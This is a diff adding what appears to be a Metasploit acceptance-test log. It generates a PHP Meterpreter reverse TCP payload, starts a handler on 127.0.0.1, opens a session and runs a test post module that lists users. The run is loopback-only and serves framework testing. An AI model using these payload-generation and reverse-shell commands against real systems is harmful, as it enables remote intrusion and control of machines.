@@ -1,0 +1,31 @@
+Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.
+[4mmsf6[0m [0m> loadpath test/modules
+Loaded 39 modules:
+    14 auxiliary modules
+    13 exploit modules
+    12 post modules
+[4mmsf6[0m [0m> use php/meterpreter_reverse_tcp
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/phpmeterpreter_reverse_tcp_session_tlv_logging20230918-4904-7vmcj6txt
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> generate -o /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/child-process-rb-php-meterpreter-reverse-tcp20230918-4904-su75ev.php -f raw AutoVerifySessionTimeout=30 lport=6001 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/phpmeterpreter_reverse_tcp_debug_log20230918-4904-3kl7fntxt MeterpreterDebugBuild=true
+SessionTlvLogging => file:/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/phpmeterpreter_reverse_tcp_session_tlv_logging20230918-4904-7vmcj6txt
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> [*] Writing 34952 bytes to /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/child-process-rb-php-meterpreter-reverse-tcp20230918-4904-su75ev.php...
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 0
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6001 
+[*] Meterpreter session 1 opened (127.0.0.1:6001 -> 127.0.0.1:49492) at 2023-09-18 22:18:52 +0000
+use test/unix
+[4mmsf6[0m post([1m[31mtest/unix[0m) [0m> run session=1 AddEntropy=true Verbose=true
+[*] Running against session 1
+[*] Session type is meterpreter and platform is osx
+[+] should list users
+[*] Testing complete in 0.37 seconds
+[*] Passed: 1; Failed: 0; Skipped: 0
+[*] Post module execution completed
+sessions -K
+[4mmsf6[0m post([1m[31mtest/unix[0m) [0m> jobs -K
+[*] 127.0.0.1 - Meterpreter session 1 closed.  Reason: Died
+[*] Killing all sessions...
+[4mmsf6[0m post([1m[31mtest/unix[0m) [0m> 
